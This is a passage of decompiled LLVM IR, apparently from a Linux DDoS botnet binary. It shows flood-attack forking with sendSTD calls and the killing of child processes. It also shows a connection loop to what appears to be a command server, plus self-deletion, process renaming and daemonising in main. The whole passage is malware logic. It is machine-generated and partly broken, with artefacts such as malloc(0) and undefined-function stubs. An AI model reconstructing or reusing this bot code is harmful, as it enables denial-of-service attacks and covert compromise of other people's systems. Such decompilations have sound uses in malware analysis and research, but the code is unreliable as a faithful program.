  %v1_8048fa1 = inttoptr i32 %v1_8048f9e to i32*
  %v2_8048fa1 = load i32, i32* %v1_8048fa1, align 4
  %v1_8048fa9 = add i32 %tmp31, 8
  %v1_8048fac = inttoptr i32 %v1_8048fa9 to i32*
  %v2_8048fac = load i32, i32* %v1_8048fac, align 4
  %v0_8048fae = load i32, i32* @esp, align 4
  %v5_8048fae = icmp ult i32 %v0_8048fae, 12
  store i1 %v5_8048fae, i1* %cf.global-to-local, align 1
  %v1_8048fb2 = call i32 @atol(i32 %v2_8048fac)
  %v1_8048fc0 = add i32 %tmp31, 12
  %v1_8048fc3 = inttoptr i32 %v1_8048fc0 to i32*
  %v2_8048fc3 = load i32, i32* %v1_8048fc3, align 4
  %v5_8048fc5 = icmp ult i32* %stack_var_-92, inttoptr (i32 12 to i32*)
  store i1 %v5_8048fc5, i1* %cf.global-to-local, align 1
  %v1_8048fc9 = call i32 @atol(i32 %v2_8048fc3)
  %v1_8048fd7 = add i32 %tmp31, 16
  %v1_8048fda = inttoptr i32 %v1_8048fd7 to i32*
  %v2_8048fda = load i32, i32* %v1_8048fda, align 4
  store i1 %v5_8048fc5, i1* %cf.global-to-local, align 1
  %v1_8048fe0 = call i32 @atol(i32 %v2_8048fda)
  %v5_8048fee = icmp ult i32* %stack_var_-92, inttoptr (i32 8 to i32*)
  store i1 %v5_8048fee, i1* %cf.global-to-local, align 1
  %v2_8048ff4 = inttoptr i32 %v2_8048fa1 to i8*
  %v3_8048ff4 = call i32 @__GI_strchr(i8* %v2_8048ff4, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048ffc = icmp eq i32 %v3_8048ff4, 0
  br i1 %v1_8048ffc, label %dec_label_pc_804905d, label %dec_label_pc_8049000

dec_label_pc_8049000:                             ; preds = %dec_label_pc_8048f9b
  store i32 %v2_8048fa1, i32* @eax, align 4
  store i1 %v5_8048fee, i1* %cf.global-to-local, align 1
  %v2_804900c = call i32 @__GI_strtok(i32 %v2_8048fa1, i32 ptrtoint (i32* @global_var_804fd35.20 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804905546 = icmp eq i32 %v2_804900c, 0
  %v1_804905947 = icmp eq i1 %v4_804905546, false
  br i1 %v1_804905947, label %dec_label_pc_8049019, label %dec_label_pc_8049088

dec_label_pc_8049019:                             ; preds = %dec_label_pc_8049000, %dec_label_pc_8049040
  %storemerge1448 = phi i32 [ %v2_804904a, %dec_label_pc_8049040 ], [ %v2_804900c, %dec_label_pc_8049000 ]
  %v0_8049019 = call i32 @listFork()
  store i32 %v0_8049019, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804901e = icmp eq i32 %v0_8049019, 0
  %v1_8049020 = icmp eq i1 %v1_804901e, false
  br i1 %v1_8049020, label %dec_label_pc_8049040, label %dec_label_pc_8049022

dec_label_pc_8049022:                             ; preds = %dec_label_pc_8049019
  %v4_804902e = trunc i32 %v1_8048fb2 to i16
  %v5_804902e = call i32 @sendSTD(i32 %storemerge1448, i16 %v4_804902e, i32 %v1_8048fc9, i32 %v1_8048fe0)
  store i1 %v5_8048fc5, i1* %cf.global-to-local, align 1
  %v1_804903b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049040:                             ; preds = %dec_label_pc_8049019
  %v0_8049040 = load i32, i32* @esp, align 4
  %v5_8049040 = icmp ult i32 %v0_8049040, 8
  store i1 %v5_8049040, i1* %cf.global-to-local, align 1
  %v2_804904a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_804fd35.20 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8049055 = icmp eq i32 %v2_804904a, 0
  %v1_8049059 = icmp eq i1 %v4_8049055, false
  br i1 %v1_8049059, label %dec_label_pc_8049019, label %dec_label_pc_8049088

dec_label_pc_804905d:                             ; preds = %dec_label_pc_8048f9b
  %v0_804905d = call i32 @listFork()
  store i32 %v0_804905d, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049062 = icmp eq i32 %v0_804905d, 0
  %v1_8049064 = icmp eq i1 %v1_8049062, false
  br i1 %v1_8049064, label %dec_label_pc_8049163, label %dec_label_pc_804906a

dec_label_pc_804906a:                             ; preds = %dec_label_pc_804905d
  %v4_8049076 = trunc i32 %v1_8048fb2 to i16
  %v5_8049076 = call i32 @sendSTD(i32 %v2_8048fa1, i16 %v4_8049076, i32 %v1_8048fc9, i32 %v1_8048fe0)
  store i1 %v5_8048fc5, i1* %cf.global-to-local, align 1
  %v1_8049083 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049088:                             ; preds = %dec_label_pc_8049000, %dec_label_pc_8049040, %entry
  %v2_804908b = load i32, i32* %v1_8048f5b, align 4
  store i32 2, i32* %stack_var_-92, align 4
  store i1 false, i1* @df, align 1
  %v4_804909f = inttoptr i32 %v2_804908b to i8*
  %v7_80490a8 = call i32 @_strncmp(i8* %v4_804909f, i8* bitcast (i8** @global_var_804fd37.21 to i8*), i32 2)
  %v8_80490a8 = urem i32 %v7_80490a8, 2
  %v9_80490a8 = icmp eq i32 %v8_80490a8, 0
  %v0_80490aa = load i1, i1* %cf.global-to-local, align 1
  %v2_80490aa = or i1 %v0_80490aa, %v9_80490a8
  %v3_80490aa = zext i1 %v2_80490aa to i8
  %v7_80490aa = xor i8 %v3_80490aa, 1
  %v3_80490b2 = zext i1 %v0_80490aa to i8
  %v4_80490b2 = sub nsw i8 %v7_80490aa, %v3_80490b2
  %v15_80490b2 = icmp eq i8 %v4_80490b2, 0
  %v2_80490b6 = sext i8 %v4_80490b2 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80490bb = icmp eq i1 %v15_80490b2, false
  br i1 %v1_80490bb, label %dec_label_pc_8049163, label %dec_label_pc_8049128.preheader

dec_label_pc_8049128.preheader:                   ; preds = %dec_label_pc_8049088
  br label %dec_label_pc_8049128

dec_label_pc_80490d1:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049128
  %v2_80490d4 = mul i32 %storemerge, 4
  %v0_80490d9 = load i32, i32* @global_var_8054564.18, align 4
  %v2_80490de = add i32 %v0_80490d9, %v2_80490d4
  %v1_80490e1 = inttoptr i32 %v2_80490de to i32*
  %v2_80490e1 = load i32, i32* %v1_80490e1, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80490e3 = icmp eq i32 %v2_80490e1, 0
  br i1 %v1_80490e3, label %dec_label_pc_8049125, label %dec_label_pc_80490e7

dec_label_pc_80490e7:                             ; preds = %dec_label_pc_80490d1
  %v9_80490d4 = and i32 %storemerge, 1073741824
  %v10_80490d4 = icmp ne i32 %v9_80490d4, 0
  store i1 %v10_80490d4, i1* %cf.global-to-local, align 1
  %v2_80490f7 = load i32, i32* %v1_80490e1, align 4
  store i32 %v2_80490f7, i32* @ebx, align 4
  %v0_80490f9 = call i32 @__libc_getpid()
  %v0_80490fe = load i32, i32* @ebx, align 4
  %v7_80490fe = icmp ult i32 %v0_80490fe, %v0_80490f9
  store i1 %v7_80490fe, i1* %cf.global-to-local, align 1
  %v12_80490fe = icmp eq i32 %v0_80490fe, %v0_80490f9
  br i1 %v12_80490fe, label %dec_label_pc_8049125, label %dec_label_pc_8049102

dec_label_pc_8049102:                             ; preds = %dec_label_pc_80490e7
  %v0_804910a = load i32, i32* @global_var_8054564.18, align 4
  %v2_804910f = add i32 %v0_804910a, %v2_80490d4
  %v1_8049112 = inttoptr i32 %v2_804910f to i32*
  %v2_8049112 = load i32, i32* %v1_8049112, align 4
  %v0_8049114 = load i32, i32* @esp, align 4
  %v5_8049114 = icmp ult i32 %v0_8049114, 8
  store i1 %v5_8049114, i1* %cf.global-to-local, align 1
  %v2_804911a = call i32 @kill(i32 %v2_8049112, i32 9)
  %v0_804911f = load i32, i32* @esp, align 4
  %v2_804911f = icmp ugt i32 %v0_804911f, -17
  store i1 %v2_804911f, i1* %cf.global-to-local, align 1
  %v4_8049122 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_8049125

dec_label_pc_8049125:                             ; preds = %dec_label_pc_80490e7, %dec_label_pc_80490d1, %dec_label_pc_8049102
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80490d1 ], [ %stack_var_-28.1, %dec_label_pc_80490e7 ], [ %v4_8049122, %dec_label_pc_8049102 ]
  %v4_8049125 = add i32 %storemerge, 1
  br label %dec_label_pc_8049128

dec_label_pc_8049128:                             ; preds = %dec_label_pc_8049128.preheader, %dec_label_pc_8049125
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8049125 ], [ 0, %dec_label_pc_8049128.preheader ]
  %storemerge = phi i32 [ %v4_8049125, %dec_label_pc_8049125 ], [ 0, %dec_label_pc_8049128.preheader ]
  %v0_8049136 = load i32, i32* @global_var_8052300.16, align 256
  %v0_804913b = load i32, i32* @global_var_8052304.17, align 4
  %v10_804914a = icmp ne i32 %v0_804913b, 0
  store i1 %v10_804914a, i1* %cf.global-to-local, align 1
  br i1 %v10_804914a, label %dec_label_pc_80490d1, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049128
  %v10_804915a = icmp ult i32 %storemerge, %v0_8049136
  store i1 %v10_804915a, i1* %cf.global-to-local, align 1
  br i1 %v10_804915a, label %dec_label_pc_80490d1, label %dec_label_pc_8049163

dec_label_pc_8049163:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8048f91, %dec_label_pc_8049088, %dec_label_pc_804905d
  %v0_804916a = phi i32 [ %v2_8048f86, %dec_label_pc_8048f91 ], [ %v2_80490b6, %dec_label_pc_8049088 ], [ %v0_804905d, %dec_label_pc_804905d ], [ %v0_8049136, %dec_label_pc_804914f ]
  %v2_8049166 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8049166, i32* @ebx, align 4
  store i32 %v0_8048f53, i32* @esi, align 4
  store i32 %v0_8048f52, i32* @edi, align 4
  ret i32 %v0_804916a

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_80490d4, { 1, 0 }
  uselistorder i1 %v0_80490aa, { 1, 0 }
  uselistorder i32 %v2_804904a, { 1, 0 }
  uselistorder i1 %v5_8048fc5, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8048fa1, { 3, 0, 2, 1 }
  uselistorder i1 %v0_8048f7a, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-92, { 2, 1, 0 }
  uselistorder i32 %tmp31, { 4, 3, 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 8, 22, 9, 10, 14, 11, 12, 13, 0, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_804fd35.20 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8049163, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8049128, { 1, 0 }
  uselistorder label %dec_label_pc_8049125, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049088, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049019, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_8049174 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_8049188 = bitcast i32* %stack_var_-4104 to i8*
  %v4_8049188 = call i32 @__GI_memset(i8* %v3_8049188, i32 0, i32 4096)
  %v0_8049190 = load i32, i32* @global_var_8052308.15, align 8
  %v1_8049195 = icmp eq i32 %v0_8049190, 0
  br i1 %v1_8049195, label %dec_label_pc_80491b4, label %dec_label_pc_8049199

dec_label_pc_8049199:                             ; preds = %entry
  %v1_80491a2 = call i32 @__libc_close(i32 %v0_8049190)
  store i32 0, i32* @global_var_8052308.15, align 8
  br label %dec_label_pc_80491b4

dec_label_pc_80491b4:                             ; preds = %entry, %dec_label_pc_8049199
  %v0_80491b4 = load i32, i32* @global_var_8052030.22, align 16
  %v1_80491b9 = icmp eq i32 %v0_80491b4, 0
  %v1_80491bb = icmp eq i1 %v1_80491b9, false
  br i1 %v1_80491bb, label %dec_label_pc_80491c9, label %dec_label_pc_80491d4

dec_label_pc_80491c9:                             ; preds = %dec_label_pc_80491b4
  %v1_80491ce = add i32 %v0_80491b4, 1
  br label %dec_label_pc_80491d4

dec_label_pc_80491d4:                             ; preds = %dec_label_pc_80491b4, %dec_label_pc_80491c9
  %storemerge = phi i32 [ %v1_80491ce, %dec_label_pc_80491c9 ], [ 0, %dec_label_pc_80491b4 ]
  store i32 %storemerge, i32* @global_var_8052030.22, align 16
  %v1_80491d9 = mul i32 %storemerge, 4
  %v2_80491d9 = add i32 %v1_80491d9, ptrtoint ([14 x i8]** @global_var_805202c.24 to i32)
  %v3_80491d9 = inttoptr i32 %v2_80491d9 to i32*
  %v4_80491d9 = load i32, i32* %v3_80491d9, align 4
  store i32 %v4_80491d9, i32* @eax, align 4
  %v3_80491eb = call i32 @strcpy(i8* %v3_8049188, i32 %v4_80491d9)
  %v3_8049206 = call i32 @__GI_strchr(i8* %v3_8049188, i32 58)
  %v1_804920e = icmp eq i32 %v3_8049206, 0
  br i1 %v1_804920e, label %dec_label_pc_804924d, label %dec_label_pc_8049212

dec_label_pc_8049212:                             ; preds = %dec_label_pc_80491d4
  %v3_804921e = call i32 @__GI_strchr(i8* %v3_8049188, i32 58)
  %v1_8049226 = add i32 %v3_804921e, 1
  %v1_804922b = call i32 @atol(i32 %v1_8049226)
  %v3_8049242 = call i32 @__GI_strchr(i8* %v3_8049188, i32 58)
  %v4_8049242 = inttoptr i32 %v3_8049242 to i8*
  store i8 0, i8* %v4_8049242, align 1
  br label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_80491d4, %dec_label_pc_8049212
  %stack_var_-8.0 = phi i32 [ 69000, %dec_label_pc_80491d4 ], [ %v1_804922b, %dec_label_pc_8049212 ]
  %v3_8049256 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_8049256, i32* @global_var_8052308.15, align 8
  %v4_8049276 = call i32 @connectTimeout(i32 %v3_8049256, i32 %v2_8049174, i32 %stack_var_-8.0, i32 30)
  %v1_804927e = icmp eq i32 %v4_8049276, 0
  %. = zext i1 %v1_804927e to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491d4, { 1, 0 }
  uselistorder label %dec_label_pc_80491b4, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %tmp67 = call i8* @__decompiler_undefined_function_3()
  %tmp76 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-4400 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_80492a0 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_80492a0, i32* @ebx, align 4
  %v4_80492b8 = ptrtoint i8** %argv to i32
  store i32 %v4_80492b8, i32* %eax.global-to-local, align 4
  %v1_80492bb = bitcast i8** %argv to i32*
  %v2_80492bb = load i32, i32* %v1_80492bb, align 4
  store i32 %v2_80492bb, i32* %eax.global-to-local, align 4
  store i32 %v2_80492bb, i32* %stack_var_-4400, align 4
  %v1_80492c1 = call i32 @unlink(i32 %v2_80492bb)
  store i32 %v1_80492c1, i32* %eax.global-to-local, align 4
  %v0_80492c9 = call i32 @rand_init()
  store i32 %v0_80492c9, i32* %eax.global-to-local, align 4
  %v0_80492ce = call i32 @rand_next()
  %v1_80492d3 = mul i32 %v0_80492ce, 4
  %v2_80492d6 = and i32 %v1_80492d3, 12
  %v1_80492d9 = add nuw nsw i32 %v2_80492d6, 12
  %v2_80492df = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_80492df, i32* @eax, align 4
  %v2_80492e6 = bitcast i32* %stack_var_-112 to i8*
  %v3_80492e6 = call i32 @rand_alphastr(i8* %v2_80492e6, i32 %v1_80492d9)
  %v0_80492f1 = load i32, i32* @ebp, align 4
  %v2_80492f1 = add nsw i32 %v2_80492d6, -92
  %v3_80492f1 = add i32 %v2_80492f1, %v0_80492f1
  %v4_80492f1 = inttoptr i32 %v3_80492f1 to i8*
  store i8 0, i8* %v4_80492f1, align 1
  store i32 %v4_80492b8, i32* %eax.global-to-local, align 4
  %v2_80492f9 = load i32, i32* %v1_80492bb, align 4
  store i32 %v2_80492f9, i32* @edx, align 4
  store i32 %v2_80492df, i32* %eax.global-to-local, align 4
  %v2_8049302 = call i32 @util_strcpy(i32 %v2_80492f9, i32 %v2_80492df)
  store i32 %v2_8049302, i32* %eax.global-to-local, align 4
  %v0_804930a = call i32 @rand_next()
  %v7_8049316 = udiv i32 %v0_804930a, 2
  store i32 %v7_8049316, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %v0_804930a, i32* @edi, align 4
  %v2_8049343 = mul i32 %v0_804930a, 4
  %v1_8049346 = add i32 %v2_8049343, 12
  store i32 %v2_80492df, i32* @eax, align 4
  %v3_8049353 = call i32 @rand_alphastr(i8* %v2_80492e6, i32 %v1_8049346)
  %v0_804935e = load i32, i32* @ebp, align 4
  %v2_804935e = add i32 %v2_8049343, -92
  %v3_804935e = add i32 %v2_804935e, %v0_804935e
  %v4_804935e = inttoptr i32 %v3_804935e to i8*
  store i8 0, i8* %v4_804935e, align 1
  store i32 %v2_80492df, i32* %eax.global-to-local, align 4
  store i32 15, i32* %stack_var_-4400, align 4
  %v2_804936c = call i32 @prctl(i32 15, i32 %v2_80492df)
  store i32 %v2_804936c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-4400, align 4
  %v2_8049379 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049379, i32* %eax.global-to-local, align 4
  store i32 %v2_8049379, i32* @ebx, align 4
  %v0_8049383 = call i32 @__libc_getpid()
  %v1_8049388 = load i32, i32* @ebx, align 4
  %v2_8049388 = xor i32 %v1_8049388, %v0_8049383
  store i32 %v2_8049388, i32* @eax, align 4
  store i32 %v2_8049388, i32* %stack_var_-4400, align 4
  %v1_804938e = call i32 @srand(i32 %v2_8049388)
  store i32 %v1_804938e, i32* %eax.global-to-local, align 4
  %v0_8049396 = call i32 @rand_init()
  store i32 %v0_8049396, i32* %eax.global-to-local, align 4
  %v1_804939b = call i32 @__libc_fork(i32 %v2_8049388)
  store i32 %v1_804939b, i32* %eax.global-to-local, align 4
  %v4_80493a3 = icmp eq i32 %v1_804939b, 0
  br i1 %v4_80493a3, label %dec_label_pc_80493d0, label %dec_label_pc_80493ca.thread

dec_label_pc_80493ca.thread:                      ; preds = %entry
  %v2_80493ae = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_80493ae, i32* %eax.global-to-local, align 4
  store i32 %v1_804939b, i32* %stack_var_-4400, align 4
  %v3_80493b8 = call i32 @__libc_waitpid(i32 %v1_804939b, i32 %v2_80493ae, i32 0)
  store i32 %v3_80493b8, i32* @eax, align 4
  store i32 0, i32* %stack_var_-4400, align 4
  %v1_80493c5 = call i32 @__GI_exit(i32 0)
  store i32 %v1_80493c5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80493e8

dec_label_pc_80493d0:                             ; preds = %entry
  %v0_80493d0 = load i32, i32* %stack_var_-4400, align 4
  %v1_80493d0 = call i32 @__libc_fork(i32 %v0_80493d0)
  store i32 %v1_80493d0, i32* @eax, align 4
  %v4_80493d8 = icmp eq i32 %v1_80493d0, 0
  br i1 %v4_80493d8, label %dec_label_pc_80493e8, label %dec_label_pc_80493de

dec_label_pc_80493de:                             ; preds = %dec_label_pc_80493d0
  %v1_80493e3 = call i32 @__GI_exit(i32 0)
  store i32 %v1_80493e3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80493e8

dec_label_pc_80493e8:                             ; preds = %dec_label_pc_80493ca.thread, %dec_label_pc_80493d0, %dec_label_pc_80493de
  %v1_80493f0 = call i32 @chdir(i32 ptrtoint (i32* @global_var_804fd39.25 to i32))
  store i32 %v1_80493f0, i32* %eax.global-to-local, align 4
  %v2_80493ff = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v2_80493ff, i32* %eax.global-to-local, align 4
  %v2_80498bc = ptrtoint i32* %stack_var_-4284 to i32
  %tmp108 = bitcast i32* %stack_var_-4284 to i8*
  %v5_804965b = and i32 %v2_80498bc, -256
  %v1_8049668 = or i32 %v2_80498bc, 1
  %v5_804969a = inttoptr i32 %v1_8049668 to i8*
  %tmp109 = bitcast i8** %stack_var_-32 to i32*
  %v2_8049873 = ptrtoint i32* %stack_var_-188 to i32
  br label %dec_label_pc_8049409.outer

dec_label_pc_8049409.outer:                       ; preds = %dec_label_pc_80498bc, %dec_label_pc_80493e8
  %stack_var_-60.0.ph = phi i8* [ %tmp67, %dec_label_pc_80493e8 ], [ %stack_var_-60.2, %dec_label_pc_80498bc ]
  %stack_var_-56.0.ph = phi i32 [ %tmp76, %dec_label_pc_80493e8 ], [ %stack_var_-56.3, %dec_label_pc_80498bc ]
  br label %dec_label_pc_8049409

dec_label_pc_8049409:                             ; preds = %dec_label_pc_8049409.outer, %dec_label_pc_8049409
  %v0_8049409 = call i32 @initConnection()
  store i32 %v0_8049409, i32* %eax.global-to-local, align 4
  %v1_804940e = icmp eq i32 %v0_8049409, 0
  %v1_8049410 = icmp eq i1 %v1_804940e, false
  br i1 %v1_8049410, label %dec_label_pc_8049409, label %dec_label_pc_80498bc.preheader

dec_label_pc_80498bc.preheader:                   ; preds = %dec_label_pc_8049409
  %v0_80498c8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80498bc

dec_label_pc_8049431:                             ; preds = %dec_label_pc_8049623, %dec_label_pc_80495d8
  %v2_8049434 = mul i32 %storemerge22, 4
  store i32 %v2_8049434, i32* %edx.global-to-local, align 4
  %v0_8049439 = load i32, i32* @global_var_8054564.18, align 4
  %v2_804943e = add i32 %v0_8049439, %v2_8049434
  store i32 %v2_804943e, i32* %eax.global-to-local, align 4
  %v1_8049441 = inttoptr i32 %v2_804943e to i32*
  %v2_8049441 = load i32, i32* %v1_8049441, align 4
  store i32 %v2_8049441, i32* %eax.global-to-local, align 4
  %v1_8049446 = add i32 %v0_8049443.in, 8
  %v2_8049446 = inttoptr i32 %v1_8049446 to i32*
  store i32 1, i32* %v2_8049446, align 4
  %v1_8049448 = add i32 %v0_8049443.in, 4
  %v2_8049448 = inttoptr i32 %v1_8049448 to i32*
  store i32 0, i32* %v2_8049448, align 4
  %v0_804944a = load i32, i32* %eax.global-to-local, align 4
  %v3_804944a = inttoptr i32 %v0_8049443.in to i32*
  store i32 %v0_804944a, i32* %v3_804944a, align 4
  %v4_804944b = call i32 @__libc_waitpid(i32 %storemerge22, i32 %v2_804944b, i32 %stack_var_-56.2)
  store i32 %v4_804944b, i32* %eax.global-to-local, align 4
  %v0_8049450 = load i32, i32* @esp, align 4
  %tmp110 = icmp slt i32 %v4_804944b, 1
  %.pre = add i32 %storemerge22, 1
  br i1 %tmp110, label %dec_label_pc_80495d5, label %dec_label_pc_804945b

dec_label_pc_804945b:                             ; preds = %dec_label_pc_8049431
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804948e

dec_label_pc_8049464:                             ; preds = %dec_label_pc_804948e, %dec_label_pc_80494c7
  %v2_8049467 = mul i32 %storemerge24, 4
  %v0_804946c = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049471 = add i32 %v0_804946c, %v2_8049467
  %v1_8049474 = add i32 %v2_8049471, -4
  store i32 %v2_8049467, i32* %edx.global-to-local, align 4
  store i32 %v2_8049471, i32* %eax.global-to-local, align 4
  %v1_8049487 = inttoptr i32 %v2_8049471 to i32*
  %v2_8049487 = load i32, i32* %v1_8049487, align 4
  store i32 %v2_8049487, i32* %eax.global-to-local, align 4
  %v2_8049489 = inttoptr i32 %v1_8049474 to i32*
  store i32 %v2_8049487, i32* %v2_8049489, align 4
  %v4_804948b = add i32 %storemerge24, 1
  br label %dec_label_pc_804948e

dec_label_pc_804948e:                             ; preds = %dec_label_pc_804945b, %dec_label_pc_8049464
  %storemerge24 = phi i32 [ %v4_804948b, %dec_label_pc_8049464 ], [ %.pre, %dec_label_pc_804945b ]
  %v0_80494a2 = load i32, i32* @global_var_8052300.16, align 256
  store i32 %v0_80494a2, i32* %eax.global-to-local, align 4
  %v0_80494a7 = load i32, i32* @global_var_8052304.17, align 4
  store i32 %v0_80494a7, i32* %edx.global-to-local, align 4
  %v10_80494bf = icmp eq i32 %v0_80494a7, 0
  br i1 %v10_80494bf, label %dec_label_pc_80494c7, label %dec_label_pc_8049464

dec_label_pc_80494c7:                             ; preds = %dec_label_pc_804948e
  store i32 0, i32* @ebx, align 4
  store i32 %v0_80494a2, i32* @edi, align 4
  %v10_80494db = icmp ult i32 %storemerge24, %v0_80494a2
  br i1 %v10_80494db, label %dec_label_pc_8049464, label %dec_label_pc_80494e3

dec_label_pc_80494e3:                             ; preds = %dec_label_pc_80494c7
  %v2_80494e6 = mul i32 %storemerge24, 4
  %v0_80494eb = load i32, i32* @global_var_8054564.18, align 4
  %v2_80494f0 = add i32 %v2_80494e6, -4
  %v1_80494f3 = add i32 %v2_80494f0, %v0_80494eb
  %v1_80494f6 = inttoptr i32 %v1_80494f3 to i32*
  store i32 0, i32* %v1_80494f6, align 4
  %v0_80494fc = load i32, i32* @global_var_8052300.16, align 256
  %v0_8049501 = load i32, i32* @global_var_8052304.17, align 4
  %v1_8049507 = add i32 %v0_80494fc, -1
  %v4_8049507 = icmp ne i32 %v0_80494fc, 0
  %v2_804950a = zext i1 %v4_8049507 to i32
  %v3_804950a = add i32 %v0_8049501, -1
  %v4_804950a = add i32 %v3_804950a, %v2_804950a
  store i32 %v1_8049507, i32* @global_var_8052300.16, align 256
  store i32 %v4_804950a, i32* @global_var_8052304.17, align 4
  %v3_8049523 = mul i32 %v4_804950a, 4
  %v4_8049523 = udiv i32 %v1_8049507, 1073741824
  %v5_8049523 = or i32 %v3_8049523, %v4_8049523
  store i32 %v5_8049523, i32* %edx.global-to-local, align 4
  %v2_8049527 = mul i32 %v1_8049507, 4
  %v1_804952a = add i32 %v2_8049527, 4
  store i32 %v1_804952a, i32* %eax.global-to-local, align 4
  %v0_804952d = load i32, i32* @esp, align 4
  %v2_8049530 = add i32 %v0_804952d, -16
  %v3_8049530 = inttoptr i32 %v2_8049530 to i32*
  store i32 %v1_804952a, i32* %v3_8049530, align 4
  %v1_8049531 = call i32 @malloc(i32 0)
  store i32 %v1_8049531, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049567

dec_label_pc_8049545:                             ; preds = %dec_label_pc_8049567, %dec_label_pc_80495a0
  %v2_8049548 = mul i32 %storemerge23, 4
  %v5_804954d = add i32 %v2_8049548, %v1_8049531
  store i32 %v2_8049548, i32* %edx.global-to-local, align 4
  %v0_8049558 = load i32, i32* @global_var_8054564.18, align 4
  %v2_804955d = add i32 %v0_8049558, %v2_8049548
  store i32 %v2_804955d, i32* %eax.global-to-local, align 4
  %v1_8049560 = inttoptr i32 %v2_804955d to i32*
  %v2_8049560 = load i32, i32* %v1_8049560, align 4
  store i32 %v2_8049560, i32* %eax.global-to-local, align 4
  %v2_8049562 = inttoptr i32 %v5_804954d to i32*
  store i32 %v2_8049560, i32* %v2_8049562, align 4
  %v4_8049564 = add i32 %storemerge23, 1
  br label %dec_label_pc_8049567

dec_label_pc_8049567:                             ; preds = %dec_label_pc_80494e3, %dec_label_pc_8049545
  %storemerge23 = phi i32 [ %v4_8049564, %dec_label_pc_8049545 ], [ 0, %dec_label_pc_80494e3 ]
  %v0_804957b = load i32, i32* @global_var_8052300.16, align 256
  store i32 %v0_804957b, i32* %eax.global-to-local, align 4
  %v0_8049580 = load i32, i32* @global_var_8052304.17, align 4
  store i32 %v0_8049580, i32* %edx.global-to-local, align 4
  %v10_8049598 = icmp eq i32 %v0_8049580, 0
  br i1 %v10_8049598, label %dec_label_pc_80495a0, label %dec_label_pc_8049545

dec_label_pc_80495a0:                             ; preds = %dec_label_pc_8049567
  store i32 0, i32* @ebx, align 4
  store i32 %v0_804957b, i32* @edi, align 4
  %v10_80495b4 = icmp ult i32 %storemerge23, %v0_804957b
  br i1 %v10_80495b4, label %dec_label_pc_8049545, label %dec_label_pc_80495bc

dec_label_pc_80495bc:                             ; preds = %dec_label_pc_80495a0
  %v0_80495bc = load i32, i32* @global_var_8054564.18, align 4
  store i32 %v0_80495bc, i32* %eax.global-to-local, align 4
  %v0_80495c1 = load i32, i32* @esp, align 4
  %v2_80495c4 = add i32 %v0_80495c1, -16
  %v3_80495c4 = inttoptr i32 %v2_80495c4 to i32*
  store i32 %v0_80495bc, i32* %v3_80495c4, align 4
  %v1_80495c5 = call i32 @free(i32 0)
  %v0_80495ca = load i32, i32* @esp, align 4
  store i32 %v1_8049531, i32* %eax.global-to-local, align 4
  store i32 %v1_8049531, i32* @global_var_8054564.18, align 4
  br label %dec_label_pc_80495d5

dec_label_pc_80495d5:                             ; preds = %dec_label_pc_8049431, %dec_label_pc_80495bc
